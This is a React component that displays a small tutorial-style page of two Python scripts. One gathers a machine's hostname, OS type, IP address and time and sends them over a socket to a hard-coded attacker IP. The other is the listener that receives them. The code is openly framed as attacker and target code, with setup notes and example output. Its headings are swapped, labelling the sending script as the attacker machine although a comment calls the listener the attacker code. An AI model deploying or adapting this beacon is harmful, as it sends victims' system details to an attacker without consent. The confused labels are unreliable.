import React, { useState, useEffect } from 'react';
import './filedisplay.css';

const FileDisplaycontrol = () => {

  return (
    <div className="file-display-container">
      <div className="file-display-item">
        <h2 className="file-display-heading">Attacker Machine</h2>
        <pre className="file-display-content">
          <code>
            {`
import socket
import os
import datetime

SERVER_IP = '192.30.12.231'  # replace with server IP, If you are the attacker then this is your ip address
SERVER_PORT = 1234  # replace with server port

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((SERVER_IP, SERVER_PORT))

hostname = socket.gethostname()
os_type = os.name
current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
ip_address = socket.gethostbyname(hostname)

message = f"Hostname: {hostname}, Operating System: {os_type}, IP address: {ip_address}, current time: {current_time}"
client_socket.send(message.encode())

client_socket.close()

            `}
          </code>
        </pre>
      </div>
      <div className="file-display-item">
        <h2 className="file-display-heading">Target Machine</h2>
        <pre className="file-display-content">
          <code>
            {`

#brother code, this is on the server side(this is the attacker code)

import socket

SERVER_IP = '192.30.12.231'  # replace with server IP, If you are the attacker then this is your ip address
SERVER_PORT = 1234  # replace with server port

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((SERVER_IP, SERVER_PORT))
server_socket.listen()

print(f"Listening on {SERVER_IP}:{SERVER_PORT}")

while True:
    conn, addr = server_socket.accept()
    print(f"Received connection from {addr[0]}:{addr[1]}")
    data = conn.recv(1024).decode()
    print(f"Received message: {data}")
    conn.close()

            `}
          </code>
        </pre>
      </div>
      <div className="file-display-item">
        <h2 className="file-display-heading">Description</h2>
        <p className="file-display-description">
          The recieving machine-attacker-will need to put their ip address in to both programs.
          <br/><br/>
          The reciever will need to be listening before the before the target machine is able to send its information
          <br/><br/>
          Example Output: <br/><br/>
          Hostname: DESKTOP-DISTO 
          <br/>
          Operating System: nt
          <br/>
          IP address: 192.30.12.231
          <br/>
          Current time: 2023-04-12 12:35:26
        </p>
      </div>
    </div>
  );
};

export default FileDisplaycontrol;
